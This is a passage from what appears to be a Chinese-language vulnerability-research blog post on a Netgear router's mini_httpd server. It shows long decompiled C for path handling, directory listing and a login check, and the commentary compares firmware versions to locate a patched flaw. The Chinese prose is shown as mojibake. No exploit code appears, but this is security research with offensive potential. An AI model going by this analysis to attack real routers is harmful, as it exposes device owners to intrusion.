+ <span class="number">2</span>; *j == <span class="number">47</span>; ++j )</span><br><span class="line">      ;</span><br><span class="line">    src = j;</span><br><span class="line">    v165 = <span class="built_in">strlen</span>(j);</span><br><span class="line">    memmove(v167 + <span class="number">1</span>, src, v165 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strncmp</span>(v162 + <span class="number">1</span>, <span class="string">&quot;./&quot;</span>, <span class="number">2u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v168 = <span class="built_in">strlen</span>(v162 + <span class="number">3</span>);</span><br><span class="line">    memmove((v162 + <span class="number">1</span>), v162 + <span class="number">3</span>, v168 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v170 = <span class="built_in">strstr</span>(v162 + <span class="number">1</span>, <span class="string">&quot;/./&quot;</span>);</span><br><span class="line">    v171 = v170;</span><br><span class="line">    <span class="keyword">if</span> ( !v170 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    src = v170 + <span class="number">2</span>;</span><br><span class="line">    v169 = <span class="built_in">strlen</span>(v170 + <span class="number">2</span>);</span><br><span class="line">    memmove(v171, src, v169 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v162 + <span class="number">1</span>, <span class="string">&quot;../&quot;</span>, <span class="number">3u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v172 = <span class="built_in">strlen</span>(v162 + <span class="number">4</span>);</span><br><span class="line">      v173 = (v162 + <span class="number">1</span>);</span><br><span class="line">      v174 = (v162 + <span class="number">4</span>);</span><br><span class="line">LABEL_473:</span><br><span class="line">      memmove(v173, v174, v172 + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v175 = <span class="built_in">strstr</span>(v162 + <span class="number">1</span>, <span class="string">&quot;/../&quot;</span>);</span><br><span class="line">  v176 = v175 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v175 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = v176 &lt; v163; !k &amp;&amp; *v176 != <span class="number">47</span>; k = v176 &lt; v163 )</span><br><span class="line">      --v176;</span><br><span class="line">    v235 = v176;</span><br><span class="line">    src = v175 + <span class="number">4</span>;</span><br><span class="line">    v172 = <span class="built_in">strlen</span>(v175 + <span class="number">4</span>);</span><br><span class="line">    v174 = src;</span><br><span class="line">    v173 = (v235 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_473;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_478:</span><br><span class="line">  v179 = <span class="built_in">strlen</span>(v162 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v179 &gt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v178 = (v163 + v179 - <span class="number">3</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((v163 + v179 - <span class="number">3</span>), <span class="string">&quot;/..&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v178 &gt;= v163 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v178 == <span class="number">47</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *v178 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_478;</span><br><span class="line">        &#125;</span><br><span class="line">        --v178;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v162[<span class="number">1</span>] )</span><br><span class="line">    dword_42C880 = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">  v180 = dword_42C880;</span><br><span class="line">  v181 = *dword_42C880;</span><br><span class="line">  <span class="keyword">if</span> ( v181 == <span class="number">47</span> || v181 == <span class="number">46</span> &amp;&amp; *(dword_42C880 + <span class="number">1</span>) == <span class="number">46</span> &amp;&amp; (!*(dword_42C880 + <span class="number">2</span>) || *(dword_42C880 + <span class="number">2</span>) == <span class="number">47</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">400</span>;</span><br><span class="line">    v18 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v20 = <span class="string">&quot;Illegal filename.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_42B620 )</span><br><span class="line">  &#123;</span><br><span class="line">    v182 = host;</span><br><span class="line">    <span class="keyword">if</span> ( !host )</span><br><span class="line">    &#123;</span><br><span class="line">      v222 = <span class="number">128</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getsockname(dword_42C86C, v230, &amp;v222) &gt;= <span class="number">0</span> )</span><br><span class="line">        v182 = ntoa(v230);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v182 = <span class="string">&quot;UNKNOWN_HOST&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_42C8A0 = v182;</span><br><span class="line">    v183 = v182;</span><br><span class="line">    <span class="keyword">for</span> ( l = dword_42C8A0; ; ++l )</span><br><span class="line">    &#123;</span><br><span class="line">      v185 = *l;</span><br><span class="line">      v160 = v185 != <span class="number">0</span>;</span><br><span class="line">      v186 = <span class="number">2</span> * v185;</span><br><span class="line">      <span class="keyword">if</span> ( !v160 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(_ctype_b + v186) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        *l = *(_ctype_tolower + v186);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_42CDF4, <span class="number">0x2710</span>u, <span class="string">&quot;%s/%s&quot;</span>, v183, v180);</span><br><span class="line">    dword_42C880 = byte_42CDF4;</span><br><span class="line">  &#125;</span><br><span class="line">  signal(<span class="number">14</span>, sub_408BE0);</span><br><span class="line">  alarm(<span class="number">0x12C</span>u);</span><br><span class="line">  v223 = stat64(dword_42C880, &amp;sb);</span><br><span class="line">  <span class="keyword">if</span> ( v223 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v187 = dword_42C880;</span><br><span class="line">    <span class="keyword">for</span> ( dword_42C884 = v187 + <span class="built_in">strlen</span>(dword_42C880); ; *dword_42C884 = <span class="number">47</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v188 = dword_42C880;</span><br><span class="line">      v189 = dword_42C884;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_42C880 &gt;= --v189 )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_42C884 = <span class="number">0</span>;</span><br><span class="line">          v190 = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_508;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *v189 != <span class="number">47</span> );</span><br><span class="line">      dword_42C884 = v189;</span><br><span class="line">      *v189 = <span class="number">0</span>;</span><br><span class="line">      v190 = stat64(v188, &amp;sb);</span><br><span class="line">      <span class="keyword">if</span> ( v190 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++dword_42C884;</span><br><span class="line">LABEL_508:</span><br><span class="line">    v223 = v190;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v223 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_545;</span><br><span class="line">  <span class="keyword">if</span> ( (!dword_42C8B4 || !*dword_42C8B4) &amp;&amp; dword_42C880 )</span><br><span class="line">  &#123;</span><br><span class="line">    v229[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    v229[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    v191 = nvram_get(<span class="string">&quot;product_name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v191 )</span><br><span class="line">      v191 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(v229, <span class="number">0x18</span>u, <span class="string">&quot;NETGEAR_%s.cfg&quot;</span>, v191);</span><br><span class="line">    v192 = <span class="built_in">strcmp</span>(dword_42C880, v229);</span><br><span class="line">    v17 = <span class="number">403</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v192 )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">      v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v20 = <span class="string">&quot;HTML is illegal.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v193 = dword_42C880;</span><br><span class="line">  v194 = v193 + <span class="built_in">strlen</span>(dword_42C880);</span><br><span class="line">  <span class="keyword">if</span> ( (dword_433B70 &amp; <span class="number">0xF000</span>) == <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(v194 - <span class="number">1</span>) != <span class="number">47</span> &amp;&amp; !dword_42C884 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *dword_42C888 )</span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/?%s&quot;</span>, path, dword_42C888);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v230, <span class="number">0x2710</span>u, <span class="string">&quot;Location: %s/&quot;</span>, path);</span><br><span class="line">      v17 = <span class="number">302</span>;</span><br><span class="line">      v18 = <span class="string">&quot;Found&quot;</span>;</span><br><span class="line">      v19 = v230;</span><br><span class="line">      v20 = <span class="string">&quot;Directories must end with a slash.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">    &#125;</span><br><span class="line">    v196 = v224;</span><br><span class="line">    <span class="keyword">while</span> ( v196 != &amp;v225 )</span><br><span class="line">    &#123;</span><br><span class="line">      src = dword_42C880;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dword_42C880, <span class="string">&quot;./&quot;</span>) )</span><br><span class="line">        <span class="built_in">snprintf</span>(v229, <span class="number">0x2710</span>u, <span class="string">&quot;%s&quot;</span>, *v196);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v229, <span class="number">0x2710</span>u, <span class="string">&quot;%s%s&quot;</span>, src, *v196);</span><br><span class="line">      <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">      &#123;</span><br><span class="line">        v196 += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v196 += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( stat64(v229, &amp;sb) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_42C880 = v229;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_535;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/http_disable_lan&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v198 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">      v199 = inet_network(v198);</span><br><span class="line">      v200 = nvram_get(<span class="string">&quot;lan_netmask&quot;</span>);</span><br><span class="line">      v202 = inet_network(v200);</span><br><span class="line">      v201 = inet_network(remote_ip);</span><br><span class="line">      v17 = <span class="number">503</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((v201 ^ v199) &amp; v202) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = <span class="string">&quot;The Share is not available&quot;</span>;</span><br><span class="line">LABEL_543:</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v20 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v203 = sc_usb_mounted(v17);</span><br><span class="line">    v17 = <span class="number">503</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v203 )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="string">&quot;No Shares Available&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_543;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_42C884 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">        usb_auth_check(dword_42C880);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        maybe_login(dword_42C880);</span><br><span class="line">      sub_4085DC();</span><br><span class="line">      <span class="keyword">if</span> ( !is_usb_session || (v204 = is_readable(dword_42C880, <span class="string">&quot;&quot;</span>), v17 = <span class="number">403</span>, v204) )</span><br><span class="line">      &#123;</span><br><span class="line">        v232 = scandir64(dword_42C880, &amp;v219, <span class="number">0</span>, &amp;alphasort64);</span><br><span class="line">        <span class="keyword">if</span> ( v232 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          strlcpy(v228, dword_42C880, <span class="number">769</span>);</span><br><span class="line">          src = dword_42C880;</span><br><span class="line">          v222 = <span class="number">0</span>;</span><br><span class="line">          v206 = encode_buf(v228);</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v230,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;&lt;!DOCTYPE html PUBLIC \&quot;-//W3C//DTD HTML 4.01 Transitional//EN\&quot; \&quot;http://www.w3.org/TR/html4/loose.dtd\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;&lt;html&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;meta http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html;charset=UTF-8\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;Index of %s&lt;/title&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;/head&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  &lt;body bgcolor=\&quot;#99cc99\&quot; text=\&quot;#000000\&quot; link=\&quot;#2020ff\&quot; vlink=\&quot;#4040cc\&quot;&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;h4&gt;Index of %s&lt;/h4&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    &lt;pre&gt;\n&quot;</span>,</span><br><span class="line">            src,</span><br><span class="line">            v206);</span><br><span class="line">          sub_40627C(&amp;v221, &amp;v222, &amp;v220, v230);</span><br><span class="line">          <span class="keyword">for</span> ( m = <span class="number">0</span>; m != v232; ++m )</span><br><span class="line">          &#123;</span><br><span class="line">            haystack = dword_42C880;</span><br><span class="line">            v208 = (*(v219 + <span class="number">4</span> * m) + <span class="number">19</span>);</span><br><span class="line">            v233 = *(v219 + <span class="number">4</span> * m);</span><br><span class="line">            <span class="built_in">snprintf</span>(byte_431CF4, <span class="number">0x7D0</span>u, <span class="string">&quot;%s/%s&quot;</span>, dword_42C880, v208);</span><br><span class="line">            <span class="keyword">if</span> ( !is_usb_session || is_readable(haystack, v208) )</span><br><span class="line">            &#123;</span><br><span class="line">              v210 = lstat64(byte_431CF4, v227);</span><br><span class="line">              v209 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v210 &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v211 = <span class="built_in">strcmp</span>(v208, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">                v209 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v211 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( !is_usb_session</span><br><span class="line">                    || (v227[<span class="number">3</span>] &amp; <span class="number">0xF000</span>) != <span class="number">40960</span></span><br><span class="line">                    || !*(v233 + <span class="number">19</span>)</span><br><span class="line">                    || (v212 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/USB_Storage&quot;</span>), v209 = <span class="string">&quot;&quot;</span>, !v212)</span><br><span class="line">                    &amp;&amp; (!<span class="built_in">strstr</span>(haystack, <span class="string">&quot;shares/&quot;</span>) || (v213 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;_Drive&quot;</span>), v209 = <span class="string">&quot;&quot;</span>, !v213)) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v208, <span class="string">&quot;..&quot;</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v214 = <span class="built_in">strcmp</span>(dword_42C880, <span class="string">&quot;shares/&quot;</span>);</span><br><span class="line">                      v209 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                      <span class="keyword">if</span> ( v214 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        sub_4079B0(v208);</span><br><span class="line">                        <span class="built_in">snprintf</span>(byte_431CF4, <span class="number">0x7D0</span>u, <span class="string">&quot;&lt;A HREF=\&quot;%s\&quot;&gt;[To Parent Directory]&lt;/A&gt;\n&quot;</span>, byte_4324C4);</span><br><span class="line">                        v209 = byte_431CF4;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      v215 = localtime(&amp;dword_433BA0);</span><br><span class="line">                      strftime(&amp;v225, <span class="number">0x3C</span>u, <span class="string">&quot;%A, %B %d, %Y  %l:%M %p&quot;</span>, v215);</span><br><span class="line">                      sub_4079B0(v208);</span><br><span class="line">                      v235 = &amp;unk_430000;</span><br><span class="line">                      strlcpy(&amp;unk_4328AC, v208, <span class="number">1531</span>);</span><br><span class="line">                      encode_buf(v235 + <span class="number">10412</span>);</span><br><span class="line">                      <span class="built_in">snprintf</span>(</span><br><span class="line">                        byte_431CF4,</span><br><span class="line">                        <span class="number">0x7D0</span>u,</span><br><span class="line">                        <span class="string">&quot;%-40s %14lld     &lt;A HREF=\&quot;%s\&quot;&gt;%s&lt;/A&gt;\n&quot;</span>,</span><br><span class="line">                        &amp;v225,</span><br><span class="line">                        v227[<span class="number">7</span>],</span><br><span class="line">                        byte_4324C4,</span><br><span class="line">                        v235 + <span class="number">10412</span>);</span><br><span class="line">                      v209 = byte_431CF4;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memset</span>(byte_431CF4, <span class="number">0</span>, <span class="keyword">sizeof</span>(byte_431CF4));</span><br><span class="line">              v209 = byte_431CF4;</span><br><span class="line">            &#125;</span><br><span class="line">            sub_40627C(&amp;v221, &amp;v222, &amp;v220, v209);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">snprintf</span>(</span><br><span class="line">            v230,</span><br><span class="line">            <span class="number">0x2710</span>u,</span><br><span class="line">            <span class="string">&quot;    &lt;/pre&gt;\n\n    &lt;hr&gt;\n\n    &lt;address&gt;&lt;a href=\&quot;%s\&quot;&gt;%s&lt;/a&gt;&lt;/address&gt;\n  \n  &lt;/body&gt;\n\n&lt;/html&gt;\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;http://www.acme.com/software/mini_httpd/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mini_httpd/1.24 10May2016&quot;</span>);</span><br><span class="line">          sub_40627C(&amp;v221, &amp;v222, &amp;v220, v230);</span><br><span class="line">          sub_407BEC(<span class="number">200</span>, <span class="string">&quot;Ok&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html; charset=%s&quot;</span>, optlen_4);</span><br><span class="line">          <span class="keyword">if</span> ( dword_42C87C != <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *(v221 + v220) = <span class="number">0</span>;</span><br><span class="line">            sub_4062F0(v221);</span><br><span class="line">          &#125;</span><br><span class="line">          v197 = sub_407648;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_578;</span><br><span class="line">        &#125;</span><br><span class="line">        v205 = ntoa(&amp;client_addr);</span><br><span class="line">        syslog(<span class="number">6</span>, <span class="string">&quot;%.80s Directory \&quot;%.80s\&quot; is protected&quot;</span>, v205, path);</span><br><span class="line">        v17 = <span class="number">403</span>;</span><br><span class="line">        v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v20 = <span class="string">&quot;Directory is protected.&quot;</span>;</span><br><span class="line">LABEL_556:</span><br><span class="line">      send_error(v17, v18, v19, v20);</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_545:</span><br><span class="line">    v17 = <span class="number">404</span>;</span><br><span class="line">    v18 = &amp;unk_415C74;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_546;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( n = (v194 - <span class="number">1</span>); *n == <span class="number">47</span>; --n )</span><br><span class="line">    *n = <span class="number">0</span>;</span><br><span class="line">LABEL_535:</span><br><span class="line">  v197 = &amp;sub_40A154;</span><br><span class="line">LABEL_578:</span><br><span class="line">  v197();</span><br><span class="line">  <span class="keyword">return</span> (SSL_free)(dword_42C8C0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ¯”è¾ƒä¸¤ä»½ä»£ç ï¼Œä¸»è¦é€»è¾‘å˜åŒ–ä¸å¤§ï¼Œä½†æ˜¯æ–°ç‰ˆä¸­æ·»åŠ äº† SSO ç›¸å…³é€»è¾‘ï¼Œå³å•ç‚¹ç™»å½•ï¼ŒçŒœæµ‹å®˜æ–¹é€šè¿‡å¼•å…¥å•ç‚¹ç™»å½•çš„æ‰‹æ®µå¯¹æ¼æ´è¿›è¡Œä¿®å¤ã€‚</p>
<p>é€šè¿‡åˆ†æä»£ç ï¼Œå¯ä»¥å®šä½åˆ°å¤„ç† login è¯·æ±‚çš„å‡½æ•°æ˜¯ 0x407FC0 (1.2.0.74)ï¼Œå…³é”®ç‰‡æ®µå¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">maybe_login</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v3)(<span class="type">const</span> <span class="type">char</span> *); <span class="comment">// $t9</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v6; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v10; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v11; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v12; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v16; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v18; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v19; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v20; <span class="comment">// $s1</span></span><br><span class="line">  FILE *v21; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v23; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v24; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v25; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v28; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v29; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">char</span> *v31; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v33; <span class="comment">// $fp</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $a0</span></span><br><span class="line">  FILE *v38; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v41; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v42; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v43; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v44; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// $v0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">v46</span>;</span> <span class="comment">// [sp+20h] [-238h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v47[<span class="number">504</span>]; <span class="comment">// [sp+60h] [-1F8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( currentsetting_flag != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// logic when currentsetting_flag != 1</span></span><br><span class="line">  &#125;</span><br><span class="line">  v2 = check_lan_guest();</span><br><span class="line">  v3 = &amp;system;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="string">&quot;/bin/echo genie from wan, drop request &gt; /dev/console&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">&quot;/bin/echo genie from lan, ok &gt; /dev/console&quot;</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(current_remote_ip, <span class="number">58</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo genie ipv6, drop request &gt; /dev/console&quot;</span>);</span><br><span class="line">    v6 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    <span class="built_in">fprintf</span>(v6, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;auth_check&quot;</span>, <span class="number">3487</span>);</span><br><span class="line">    <span 